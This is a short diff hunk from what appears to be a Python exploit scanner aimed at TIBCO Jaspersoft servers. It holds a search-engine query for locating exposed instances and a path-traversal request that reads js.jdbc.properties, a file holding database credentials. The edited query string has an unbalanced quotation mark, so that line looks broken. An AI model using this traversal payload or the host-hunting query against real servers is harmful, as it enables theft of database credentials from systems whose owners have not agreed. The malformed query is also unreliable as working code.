@@ -15,7 +15,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
 API_KEY = "YOURAPIKEY"
-SEARCH_FOR = 'title:"TIBCO Jaspersoft:" port:443'
+SEARCH_FOR = 'title:"TIBCO Jaspersoft:" port:"443" 1970"'
 FILE = "/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"
 session = requests.Session()
 
